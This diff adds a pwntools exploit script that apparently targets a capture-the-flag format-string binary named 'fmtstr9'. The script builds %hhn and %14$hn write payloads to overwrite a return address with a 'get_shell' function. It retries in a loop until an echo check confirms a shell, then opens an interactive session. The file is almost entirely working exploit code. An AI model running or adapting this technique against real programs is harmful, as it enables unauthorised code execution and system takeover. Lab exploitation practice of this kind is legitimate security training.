@@ -1,0 +1,37 @@
+from pwn import *
+
+
+#p = process("./fmtstr9")
+'''
+p = gdb.debug("./fmtstr9", gdbscript = 
+break *play + 111
+r
+)
+'''
+e = ELF("./fmtstr9")
+
+win = e.symbols['get_shell'] + 5
+print(hex(win & 0xffff - 0x68))
+
+while(True):
+    p = process("./fmtstr9")
+    
+    p.sendlineafter(b"> ", b"1")
+
+    payload = b"%c" * 8 + f"%{0x68 - 8}c%hhn".encode()
+    payload += f"%{(win & 0xffff) - 0x68}c%14$hn".encode()
+    p.sendlineafter(b"name: ", payload)
+
+    p.sendlineafter(b"guess: ", b"1")
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil(b"vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+print("wtf")
+p.interactive()
